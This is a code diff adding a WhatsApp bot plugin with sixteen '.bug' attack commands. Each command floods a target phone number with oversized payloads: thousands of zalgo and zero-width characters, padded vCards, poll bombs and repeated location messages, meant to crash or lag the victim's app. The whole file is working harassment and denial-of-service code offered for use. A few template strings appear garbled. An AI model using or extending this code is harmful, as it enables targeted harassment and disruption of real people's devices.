@@ -1,0 +1,224 @@
+const { cmd } = require('../command');
+
+const OWNER_NUMBERS = ['947xxxxxxxxx']; // ← CHANGE TO YOUR NUMBER
+
+const heavySpam = "\u0345\u0361\u0345".repeat(900) + "҉".repeat(600) + "\u200B\u200C\u200D\uFEFF".repeat(500) + "꧁꧂".repeat(200);
+
+const baseLoc = { degreesLatitude: 24.121231, degreesLongitude: 55.112122 };
+
+function getVCard(title, extra = "") {
+    return `BEGIN:VCARD\nVERSION:3.0\nFN:SANUKA-REAL KARIYA 💀\nORG:\( {title};\nTEL;type=CELL;type=VOICE;waid=947xxxxxxxx:+94 71 234 5678\nX-ABLabel: \){heavySpam}${extra}\nEND:VCARD`;
+}
+
+const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
+
+let isAttacking = false;   // Global flag to stop attacks
+
+cmd({
+    pattern: "bug",
+    alias: ["bug1","bug2","bug3","bug4","bug5","bug6","bug7","bug8","bug9","bug10","bug11","bug12","bug13","bug14","bug15","bug16"],
+    desc: "SANUKA-REAL KARIYA 16 Different Bug Attacks",
+    category: "owner",
+    filename: __filename
+}, async (conn, mek, m, { from, senderNumber, args, reply }) => {
+    try {
+        const isOwner = OWNER_NUMBERS.some(num => senderNumber.includes(num.replace(/[^0-9]/g, '')));
+        if (!isOwner) return reply("❌ Only owner can use this.");
+
+        let bugNum = args[0] ? parseInt(args[0]) : null;
+        if (!bugNum) {
+            const match = m.text.match(/\.bug(\d+)/i);
+            bugNum = match ? parseInt(match[1]) : null;
+        }
+
+        if (!bugNum || bugNum < 1 || bugNum > 16) {
+            return reply("Usage: .bug<number> 947xxxxxxxx\nExample: .bug8 947xxxxxxxx\n\n.buglist to see all");
+        }
+
+        let target = args[1] ? args[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : 
+                     (m.quoted ? m.quoted.sender : null);
+
+        if (!target) return reply("❌ Please provide target number or quote a message.\nEx: .bug5 947xxxxxxxx");
+
+        // Check if stop was requested
+        if (isAttacking) {
+            return reply("⚠️ An attack is already running. Use `.sbug` to stop first.");
+        }
+
+        isAttacking = true;
+
+        // Immediate Reaction
+        await conn.sendMessage(from, { react: { text: "☣️", key: m.key } });
+
+        await reply(`🔹 *Bug ${bugNum} Activated*\nRunning attack...`);
+
+        switch (bugNum) {
+
+            case 1: // Light Text Spam
+                for (let i = 0; i < 6; i++) {
+                    if (!isAttacking) break;
+                    await conn.sendMessage(target, { text: "SANUKA-REAL KARIYA 💀\n" + heavySpam.substring(0, 1000) });
+                    await delay(1800);
+                }
+                break;
+
+            case 2: // Classic VCard
+                const vc2 = getVCard("Classic Attack");
+                for (let i = 0; i < 7; i++) {
+                    if (!isAttacking) break;
+                    await conn.sendMessage(target, { contacts: { displayName: 'SANUKA-REAL KARIYA', contacts: [{ vcard: vc2 }] } });
+                    await delay(1600);
+                }
+                break;
+
+            case 3: // Location + Text
+                for (let i = 0; i < 7; i++) {
+                    if (!isAttacking) break;
+                    await conn.sendMessage(target, { location: baseLoc });
+                    await conn.sendMessage(target, { text: "SANUKA-REAL KARIYA v3 💀\n" + heavySpam.substring(0, 1600) });
+                    await delay(1700);
+                }
+                break;
+
+            case 4: // Poll Bomb
+                const poll4 = { name: "SANUKA-REAL KARIYA POLL 💀", values: Array(12).fill(0).map((_,i) => `Option ${i+1} ${"҉".repeat(28)}`), selectableCount: 1 };
+                for (let i = 0; i < 6; i++) {
+                    if (!isAttacking) break;
+                    await conn.sendMessage(target, { poll: poll4 });
+                    await delay(1550);
+                }
+                break;
+
+            case 5: // Heavy VCard
+                const vc5 = getVCard("Heavy", "\u0300\u0301\u0302\u0303".repeat(800));
+                for (let i = 0; i < 8; i++) {
+                    if (!isAttacking) break;
+                    await conn.sendMessage(target, { contacts: { displayName: 'SANUKA-REAL KARIYA Heavy', contacts: [{ vcard: vc5 }] } });
+                    await delay(1450);
+                }
+                break;
+
+            case 6: // Reaction + Text Spam
+                for (let i = 0; i < 9; i++) {
+                    if (!isAttacking) break;
+                    await conn.sendMessage(target, { text: "SANUKA-REAL KARIYA v6 UNHINGED 💀\n" + heavySpam.substring(0, 2100) });
+                    try { await conn.sendMessage(target, { reaction: { key: m.key, text: "💀" } }); } catch(e){}
+                    await delay(1350);
+                }
+                break;
+
+            case 7: // Live Location Spam
+                for (let i = 0; i < 8; i++) {
+                    if (!isAttacking) break;
+                    await conn.sendMessage(target, {
+                        liveLocation: {
+                            ...baseLoc,
+                            accuracy: 10,
+                            caption: "SANUKA-REAL KARIYA LIVE ATTACK 💀"
+                        }
+                    });
+                    await delay(1750);
+                }
+                break;
+
+            case 8: // MAXIMUM BEAST
+                await reply("☣️☣️ MAXIMUM BEAST MODE ACTIVATED...");
+                const vc8 = getVCard("MAX BEAST", "\u0300\u0301\u0302".repeat(1000));
+                const poll8 = { name: "SANUKA MAX POLL 💀", values: Array(10).fill(0).map((_,i) => `MAX OPTION ${i+1}`), selectableCount: 1 };
+                for (let i = 0; i < 8; i++) {
+                    if (!isAttacking) break;
+                    await conn.sendMessage(target, { contacts: { displayName: 'SANUKA MAX', contacts: [{ vcard: vc8 }] } });
+                    await conn.sendMessage(target, { location: baseLoc });
+                    await conn.sendMessage(target, { poll: poll8 });
+                    await conn.sendMessage(target, { text: "SANUKA-REAL KARIYA v8 MAX UNHINGED 💀\n" + heavySpam.substring(0, 2300) });
+                    await delay(2000);
+                }
+                break;
+
+            // Cases 9 to 16 (same as before)
+            case 9: // Zalgo Text Overload
+                for (let i = 0; i < 7; i++) { if (!isAttacking) break; await conn.sendMessage(target, { text: heavySpam + "\u0300\u0301\u0302\u0303\u0304".repeat(300) }); await delay(1600); }
+                break;
+
+            case 10:
+                const vc10 = getVCard("Mixed");
+                for (let i = 0; i < 7; i++) { if (!isAttacking) break; await conn.sendMessage(target, { contacts: { displayName: 'SANUKA MIX', contacts: [{ vcard: vc10 }] } }); await conn.sendMessage(target, { location: baseLoc }); await delay(1650); }
+                break;
+
+            case 11:
+                for (let i = 0; i < 10; i++) { if (!isAttacking) break; await conn.sendMessage(target, { text: "SANUKA-REAL KARIYA v11 💀\n" + heavySpam.substring(0, 2400) }); try { await conn.sendMessage(target, { reaction: { key: m.key, text: "☣️" } }); } catch(e){} await delay(1300); }
+                break;
+
+            case 12:
+                const poll12 = { name: "SANUKA COMBO POLL 💀", values: Array(8).fill(0).map((_,i) => `ATTACK ${i+1}`), selectableCount: 1 };
+                const vc12 = getVCard("Combo");
+                for (let i = 0; i < 6; i++) { if (!isAttacking) break; await conn.sendMessage(target, { poll: poll12 }); await conn.sendMessage(target, { contacts: { displayName: 'SANUKA', contacts: [{ vcard: vc12 }] } }); await delay(1700); }
+                break;
+
+            case 13:
+                for (let i = 0; i < 8; i++) { if (!isAttacking) break; await conn.sendMessage(target, { text: heavySpam + "\u0300\u0301\u0302\u0303\u0304\u0305\u0306".repeat(400) }); await delay(1550); }
+                break;
+
+            case 14:
+                for (let i = 0; i < 9; i++) { if (!isAttacking) break; await conn.sendMessage(target, { liveLocation: { ...baseLoc, caption: "SANUKA LIVE v14 💀" } }); await conn.sendMessage(target, { text: "SANUKA-REAL KARIYA v14 ATTACK 💀" }); await delay(1800); }
+                break;
+
+            case 15:
+                for (let i = 0; i < 7; i++) { if (!isAttacking) break; await conn.sendMessage(target, { contacts: { displayName: 'SANUKA v15', contacts: [{ vcard: getVCard("Intense") }] } }); await conn.sendMessage(target, { text: heavySpam.substring(0, 2500) }); await delay(1600); }
+                break;
+
+            case 16: // ULTIMATE BEAST
+                await reply("☣️☣️ ULTIMATE BEAST MODE - FULL POWER 💀");
+                const vc16 = getVCard("ULTIMATE", "\u0300\u0301\u0302".repeat(1200));
+                for (let i = 0; i < 9; i++) {
+                    if (!isAttacking) break;
+                    await conn.sendMessage(target, { contacts: { displayName: 'SANUKA ULTIMATE', contacts: [{ vcard: vc16 }] } });
+                    await conn.sendMessage(target, { location: baseLoc });
+                    await conn.sendMessage(target, { text: "SANUKA-REAL KARIYA v16 ULTIMATE ATTACK 💀\n" + heavySpam.substring(0, 2600) });
+                    try { await conn.sendMessage(target, { reaction: { key: m.key, text: "💀" } }); } catch(e){}
+                    await delay(1900);
+                }
+                break;
+        }
+
+        isAttacking = false;
+        await reply(`✅ *Bug ${bugNum} Completed Successfully*`);
+
+    } catch (e) {
+        isAttacking = false;
+        console.error("Bug Error:", e);
+        await reply("❌ Attack failed due to an error.");
+    }
+});
+
+// ===================== EMERGENCY STOP COMMAND =====================
+cmd({
+    pattern: "sbug",
+    alias: ["stopbug", "stop"],
+    desc: "Emergency Stop All Bug Attacks",
+    category: "owner",
+    filename: __filename
+}, async (conn, mek, m, { reply }) => {
+    if (isAttacking) {
+        isAttacking = false;
+        await reply("🛑 *Emergency Stop Activated*\nAll bug attacks have been stopped.");
+    } else {
+        await reply("✅ No attack is currently running.");
+    }
+});
+
+// Bug List
+cmd({
+    pattern: "buglist",
+    alias: ["bugs", "bug list"],
+    desc: "List all 16 bug attacks",
+    category: "owner",
+    filename: __filename
+}, async (conn, mek, m, { reply }) => {
+    let text = "💀 *SANUKA-REAL KARIYA 16 Bug Attacks*\n\n";
+    for (let i = 1; i <= 16; i++) {
+        text += `\( {i}. .bug \){i}\n`;
+    }
+    text += "\nUsage: .bug8 947xxxxxxxxxx\n.sbug → Emergency Stop";
+    await reply(text);
+});
